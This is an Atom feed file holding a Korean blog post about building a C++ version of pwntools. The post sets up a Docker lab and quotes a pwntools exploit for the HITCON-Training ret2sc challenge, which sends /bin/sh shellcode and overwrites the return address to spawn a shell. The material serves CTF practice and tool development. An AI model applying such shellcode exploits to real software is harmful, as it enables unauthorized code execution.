@@ -1,0 +1,112 @@
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.2.0">Jekyll</generator><link href="https://lucid78.github.io/feed.xml" rel="self" type="application/atom+xml" /><link href="https://lucid78.github.io/" rel="alternate" type="text/html" /><updated>2021-01-10T17:18:20+09:00</updated><id>https://lucid78.github.io/feed.xml</id><title type="html">Security Warehouse</title><subtitle>security researcher.</subtitle><author><name>lucid7</name></author><entry><title type="html">Pwntools Cpp</title><link href="https://lucid78.github.io/pwntools-cpp/" rel="alternate" type="text/html" title="Pwntools Cpp" /><published>2021-01-10T00:00:00+09:00</published><updated>2021-01-10T00:00:00+09:00</updated><id>https://lucid78.github.io/pwntools-cpp</id><content type="html" xml:base="https://lucid78.github.io/pwntools-cpp/">&lt;p&gt;pwntools는 CTF에 관심있는 사람이라면 한번쯤은 들어봤을 법한 pwnable을 위한 전용 도구이다. (&lt;a href=&quot;https://github.com/Gallopsled/pwntools&quot;&gt;https://github.com/Gallopsled/pwntools&lt;/a&gt;)&lt;/p&gt;
+
+&lt;p&gt;python으로 제작된 이 도구는 ctf에서 pwnable을 빠르게 진행할 수 있도록 각종 편의 기능을 보유하고 있어 매우 편리하다.
+만약 비교적 최근에 pwnable을 시작한 newbie라면 hexray(IDA)와 pwntools 없이는 pwnable이 불가능할 수도 있을만큼 필수적인 도구로 자리매김하고 있다.&lt;/p&gt;
+
+&lt;p&gt;취미 생활로 CTF 풀이를 할 때마다 예전 버릇이 남아있어 주로 cpp로 exploit 코드를 작성하곤 했는데, 아무래도 pwntools가 엄청 편리한지라 라이브러리를 한번 찾아보게 되었다.
+github에 몇 개의 비슷한 프로그램이 있기는 했지만 딱히 마음에 드는 게 없어서 직접 만들어보기로 결심하였고, 모자란 기억을 보충하기 위해 개발 히스토리를 블로그에 남겨보고자 한다.&lt;/p&gt;
+
+&lt;p&gt;가급적 노가다를 줄이기 위해 boost(&lt;a href=&quot;https://www.boost.org/&quot;&gt;https://www.boost.org/&lt;/a&gt;)를 이용해 개발하기로 하였다.(사실 왜 boost로 시작했는지 잘 기억은 안나는데, 매뉴얼 및 사용층이 부족한 boost를 선택한 것이 과연 노가다를 줄이기는 한 건지 좀 의심되기는 한다;;;).
+그리고 프로그램의 테스트는 Hitcon-Trainning(&lt;a href=&quot;https://github.com/scwuaptx/HITCON-Training&quot;&gt;https://github.com/scwuaptx/HITCON-Training&lt;/a&gt;) 문제를 사용하기로 했다.&lt;/p&gt;
+
+&lt;h3 id=&quot;환경-구축&quot;&gt;&lt;strong&gt;환경 구축&lt;/strong&gt;&lt;/h3&gt;
+
+&lt;p&gt;pwntoolcpp의 최종 형태는 라이브러리가 될  예정이지만 쉽고 빠르고 간단한 테스트를 위해 일단 하나의 프로그램에서 동작하도록 작성하기로 한다.
+~/workspaces 아래에 ptcpp라는 디렉토리를 생성하여 docker 실행 시 연결되도록 하고, 소스 에디팅은 Host에서, compile만 docker에서 하도록 하였다.&lt;/p&gt;
+
+&lt;p&gt;아래 dockerfile과 run.sh를 이용해 테스트 환경을 구축하자.&lt;/p&gt;
+
+&lt;div class=&quot;language-docker highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;FROM&lt;/span&gt;&lt;span class=&quot;s&quot;&gt; ubuntu:latest&lt;/span&gt;
+
+&lt;span class=&quot;k&quot;&gt;ENV&lt;/span&gt;&lt;span class=&quot;s&quot;&gt; DEBIAN_FRONTEND=noninteractive&lt;/span&gt;
+
+&lt;span class=&quot;k&quot;&gt;RUN &lt;/span&gt;apt-get update &lt;span class=&quot;nt&quot;&gt;--fix-missing&lt;/span&gt; &lt;span class=&quot;se&quot;&gt;\
+&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; apt-get &lt;span class=&quot;nt&quot;&gt;-y&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;install &lt;/span&gt;locales &lt;span class=&quot;se&quot;&gt;\
+&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; locale-gen en_US.UTF-8 &lt;span class=&quot;se&quot;&gt;\
+&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; apt-get &lt;span class=&quot;nt&quot;&gt;-y&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;install &lt;/span&gt;gcc net-tools vim nano gdb python3 wget git make procps gcc-multilib socat cmake &lt;span class=&quot;se&quot;&gt;\
+&lt;/span&gt;                       	libpcre3-dev libdb-dev libxt-dev libxaw7-dev curl binutils nasm bash-completion &lt;span class=&quot;se&quot;&gt;\
+&lt;/span&gt;                       	build-essential software-properties-common g++-multilib libssl-dev apport &lt;span class=&quot;se&quot;&gt;\
+&lt;/span&gt;                       	python3-pip python-dev netcat &lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;libc6-dbg-i386-cross libc6-dbg telnet &lt;span class=&quot;se&quot;&gt;\
+&lt;/span&gt;                        libc6-i386 libboost-all-dev &lt;span class=&quot;se&quot;&gt;\
+&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; adduser &lt;span class=&quot;nt&quot;&gt;--disabled-password&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--gecos&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;&apos;&lt;/span&gt; guest &lt;span class=&quot;se&quot;&gt;\
+&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;guest:guest&apos;&lt;/span&gt; | chpasswd &lt;span class=&quot;se&quot;&gt;\
+&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; wget &lt;span class=&quot;nt&quot;&gt;-O&lt;/span&gt; /home/guest/.gdbinit-gef.py &lt;span class=&quot;nt&quot;&gt;-q&lt;/span&gt; http://gef.blah.cat/py &lt;span class=&quot;se&quot;&gt;\
+&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;source /home/guest/.gdbinit-gef.py&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;/home/guest/.gdbinit&quot;&lt;/span&gt; &lt;span class=&quot;se&quot;&gt;\
+&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;catch exec&quot;&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&lt;/span&gt; /home/guest/.gdbinit &lt;span class=&quot;se&quot;&gt;\
+&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;set follow-fork-mode child&quot;&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&lt;/span&gt; /home/guest/.gdbinit &lt;span class=&quot;se&quot;&gt;\
+&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;chown &lt;/span&gt;guest:guest /home/guest/.gdbinit-gef.py /home/guest/.gdbinit &lt;span class=&quot;se&quot;&gt;\
+&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; python3 &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; pip &lt;span class=&quot;nb&quot;&gt;install&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--upgrade&lt;/span&gt; pip &lt;span class=&quot;se&quot;&gt;\
+&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; python3 &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; pip &lt;span class=&quot;nb&quot;&gt;install &lt;/span&gt;pwntools &lt;span class=&quot;se&quot;&gt;\
+&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; python3 &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; pip &lt;span class=&quot;nb&quot;&gt;install &lt;/span&gt;setuptools &lt;span class=&quot;se&quot;&gt;\
+&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; python3 &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; pip &lt;span class=&quot;nb&quot;&gt;install &lt;/span&gt;capstone &lt;span class=&quot;se&quot;&gt;\
+&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; python3 &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; pip &lt;span class=&quot;nb&quot;&gt;install &lt;/span&gt;pwntools &lt;span class=&quot;se&quot;&gt;\
+&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; python3 &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; pip &lt;span class=&quot;nb&quot;&gt;install &lt;/span&gt;ropgadget &lt;span class=&quot;se&quot;&gt;\
+&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; curl https://bootstrap.pypa.io/get-pip.py &lt;span class=&quot;nt&quot;&gt;--output&lt;/span&gt; get-pip.py &lt;span class=&quot;se&quot;&gt;\
+&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; python2 get-pip.py &lt;span class=&quot;se&quot;&gt;\
+&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; python2 &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; pip &lt;span class=&quot;nb&quot;&gt;install &lt;/span&gt;pwntools &lt;span class=&quot;se&quot;&gt;\
+&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;%sudo ALL=(ALL:ALL) ALL&quot;&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&lt;/span&gt; /etc/sudoers &lt;span class=&quot;se&quot;&gt;\
+&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; usermod &lt;span class=&quot;nt&quot;&gt;-aG&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;guest 
+
+&lt;span class=&quot;k&quot;&gt;RUN &lt;/span&gt;dpkg &lt;span class=&quot;nt&quot;&gt;--add-architecture&lt;/span&gt; i386 &lt;span class=&quot;se&quot;&gt;\
+&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; git clone https://github.com/scwuaptx/HITCON-Training /tmp/hitcon
+
+&lt;span class=&quot;k&quot;&gt;WORKDIR&lt;/span&gt;&lt;span class=&quot;s&quot;&gt; /home/guest/ptcpp&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;#!/bin/bash&lt;/span&gt;
+
+&lt;span class=&quot;nv&quot;&gt;TAG&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;build
+&lt;span class=&quot;nv&quot;&gt;HOME&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/home/lucid7 &lt;span class=&quot;k&quot;&gt;**&lt;/span&gt;&amp;lt;&lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; 수정 필요&lt;span class=&quot;k&quot;&gt;**&lt;/span&gt;
+docker build &lt;span class=&quot;nt&quot;&gt;--tag&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$TAG&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
+docker run &lt;span class=&quot;nt&quot;&gt;--cap-add&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;SYS_PTRACE &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
+           &lt;span class=&quot;nt&quot;&gt;--security-opt&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;seccomp&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;unconfined &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
+           &lt;span class=&quot;nt&quot;&gt;--name&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$TAG&lt;/span&gt; &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
+           &lt;span class=&quot;nt&quot;&gt;--user&lt;/span&gt; guest &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
+           &lt;span class=&quot;nt&quot;&gt;--hostname&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$TAG&lt;/span&gt; &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
+           &lt;span class=&quot;nt&quot;&gt;--entrypoint&lt;/span&gt; /bin/bash &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
+           &lt;span class=&quot;nt&quot;&gt;-it&lt;/span&gt; &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
+           &lt;span class=&quot;nt&quot;&gt;--volume&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$HOME&lt;/span&gt;/workspaces/ptcpp:/home/guest/ptcpp &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
+           &lt;span class=&quot;nv&quot;&gt;$TAG&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;약간의 시간이 흐른 후 아래와 같이 docker 개발 환경 구축이 완성된다.
+&lt;img src=&quot;/assets/images/docker.png&quot; alt=&quot;full&quot; /&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;문제-확인&quot;&gt;&lt;strong&gt;문제 확인&lt;/strong&gt;&lt;/h3&gt;
+
+&lt;p&gt;HITCON LAB3 문제를 확인해보자.
+해당 파일은 /tmp/hitcon 디렉토리 안에 위치해 있다.&lt;/p&gt;
+
+&lt;p&gt;ret2sc.c 소스를 보면 아래와 같이 가장 기초적인 문제임을 알 수 있다.
+&lt;img src=&quot;/assets/images/ret2sc.c.png&quot; alt=&quot;full&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;해당 문제를 검색해 보면 다음과 같은 풀이집이 있다. (&lt;a href=&quot;https://ii4gsp.tistory.com/97&quot;&gt;https://ii4gsp.tistory.com/97&lt;/a&gt;)&lt;/p&gt;
+
+&lt;p&gt;아래는 해당 풀이집에서 발췌한 pwntools를 이용한 exploit code이다.&lt;/p&gt;
+&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;pwn&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;process&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;/home/ii4gsp/HITCON-Training/LAB/lab3/ret2sc&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;shellcode&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;name&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x804a060&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recvuntil&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;:&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;shellcode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&apos;&apos;&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x90&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;32&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p32&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recvuntil&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;:&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;interactive&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;위의 python 코드를 보면 “:” 문자열이 나올때까지 출력을 읽어(recvuntil) 특정 값을 쓰는(sendline) 동작을 2번 반복한 다음 마지막으로 interactive() 함수를 호출한다.&lt;/p&gt;
+
+&lt;p&gt;위의 exploit code에서 ret2sc 패스만 수정하여 실행해보면 아래와 같이 정상적으로 shell을 획득하는 것을 볼 수 있다.
+&lt;img src=&quot;/assets/images/ret2sc.png&quot; alt=&quot;full&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;지금까지 cpp를 이용한 pwntools를 제작하기 위한 개발환경 구축 및 pwntools를 이용한 exploit 코드의 기본적인 동작을 분석하였다.
+다음 시간에는 위의 코드를 기반으로 pwntoolcpp를 제작해 볼 것이다.
+우리가 만들어야 할 기본 기능은 process라는 클래스와 recvuntil(), sendline(), p32(), interactive() 멤버 함수이다.&lt;/p&gt;</content><author><name>lucid7</name></author><summary type="html">pwntools는 CTF에 관심있는 사람이라면 한번쯤은 들어봤을 법한 pwnable을 위한 전용 도구이다. (https://github.com/Gallopsled/pwntools)</summary></entry></feed>
